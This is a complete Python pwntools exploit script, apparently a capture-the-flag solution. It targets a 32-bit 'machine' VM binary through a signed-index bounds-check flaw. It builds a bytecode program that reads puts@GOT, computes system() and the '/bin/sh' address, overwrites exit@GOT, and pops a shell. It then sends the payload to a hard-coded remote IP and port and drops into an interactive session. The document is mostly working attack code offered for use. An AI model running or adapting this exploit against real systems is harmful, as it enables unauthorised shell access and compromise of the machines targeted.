#!/usr/bin/env python3
# Exploit for ./machine  (Unknown Machine VM)
#
# Bug: vm_memory_put / vm_memory_get take a SIGNED byte index and only check
#      `index <= 0x3f` (signed).  A negative index (0x80..0xff) passes the check
#      and lets the VM read/write dwords BEFORE the `vm` struct (0x4060), i.e.
#      straight into the GOT.  Offsets are relative to `vm`, so PIE doesn't matter.
#
# There is no output instruction, so this is a *blind* exploit: we read the
# already-resolved puts@GOT onto the VM stack, do arithmetic on it to build
# system() and &"/bin/sh", overwrite exit@GOT with system, then let the `exit`
# opcode fire  ->  system("/bin/sh").
#
# VM opcodes (1 ASCII byte each):
#   '0' push 0   '1' push 1   '2' pop     '3' add   '4' sub   '5' mul
#   '6' div      '7' mod      '8' mem_put '9' mem_get          'A' exit
#
# add : pushes (top + below)
# sub : pushes (top - below)        <-- top minus the one under it
# mem_put: pops index(top), pops value -> [vm + index*4] = value
# mem_get: pops index(top)           -> push [vm + index*4]

from pwn import *
import sys

context.binary = ELF('./machine', checksec=False)
context.log_level = 'info'

# Default target is REMOTE.  Pass --local to run ./machine against the host libc.
LOCAL = '--local' in sys.argv
REMOTE = not LOCAL

# vm base offset in the image = 0x4060.  GOT entries -> negative indices.
IDX_PUTS = (0x4014 - 0x4060) // 4      # -19  -> low byte 0xED, passes signed check
IDX_EXIT = (0x4018 - 0x4060) // 4      # -18  -> low byte 0xEE
assert IDX_PUTS == -19 and IDX_EXIT == -18

# libc-specific, ASLR-independent deltas.  The exploit is *relative* to the
# already-resolved puts@GOT, so we only need the deltas from the libc that the
# TARGET runs.  Remote runs the provided ./libc.so.6 (Debian GLIBC 2.19); the
# host libc has completely different offsets, so it MUST NOT be used for remote.
if REMOTE:
    libc = ELF('./libc.so.6', checksec=False)          # provided (Debian 2.19), == remote
else:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)  # host libc

puts_off   = libc.symbols['puts']
system_off = libc.symbols['system']
binsh_off  = next(libc.search(b'/bin/sh\x00'))
D_SYSTEM = (system_off - puts_off) & 0xffffffff
D_BINSH  = (binsh_off  - puts_off) & 0xffffffff
log.info("system-puts = %#x   binsh-puts = %#x" % (D_SYSTEM, D_BINSH))


def pushc(n):
    """Emit opcodes that push the non-negative constant n via double-and-add."""
    n &= 0xffffffff
    if n == 0:
        return '0'
    bits = bin(n)[2:]
    s = '1'                       # leading 1 bit
    for b in bits[1:]:
        s += '1135'               # double: push 2 (1 1 +) then multiply (*)
        if b == '1':
            s += '13'             # +1
    return s


def get_puts():
    # push index, mem_get  -> puts on top of VM stack
    return pushc(IDX_PUTS & 0xff) + '9'


prog = ''

# --- Phase A: exit@GOT = system ------------------------------------------
# system = puts - |D_SYSTEM|.  Build magnitude, put puts on top, subtract.
mag_sys = (-D_SYSTEM) & 0xffffffff          # small positive magnitude
prog += pushc(mag_sys)                       # [mag]
prog += get_puts()                           # [mag, puts]
prog += '4'                                  # sub: puts - mag = system  -> [system]
prog += pushc(IDX_EXIT & 0xff)               # [system, 0xee]
prog += '8'                                   # mem_put: exit@GOT = system  -> []

# --- Phase B: call exit() == system("/bin/sh") ---------------------------
prog += get_puts()                           # [puts]
prog += pushc(D_BINSH)                        # [puts, dbinsh]
prog += '3'                                   # add -> [&"/bin/sh"]
prog += 'A'                                   # vm_exit -> exit@plt -> system(arg)

assert '\n' not in prog and '\x00' not in prog
assert len(prog) < 0x3ff, len(prog)
log.info("program length = %d bytes" % len(prog))

if REMOTE:
    io = remote("141.85.224.104", 33341)
else:
    io = process('./machine')

# NOTE: the trailing '\n' that sendline() appends is harmless here.  Our program
# ends with 'A' (vm_exit), which calls exit@GOT (now system) and never returns to
# the opcode loop, so the '\n' is never interpreted as an (illegal) opcode.
#
# Remote stdout is fully buffered (setvbuf _IOFBF), so the banner does not flush
# until the process would exit -- irrelevant for this blind exploit.
io.sendline(prog)

io.interactive()
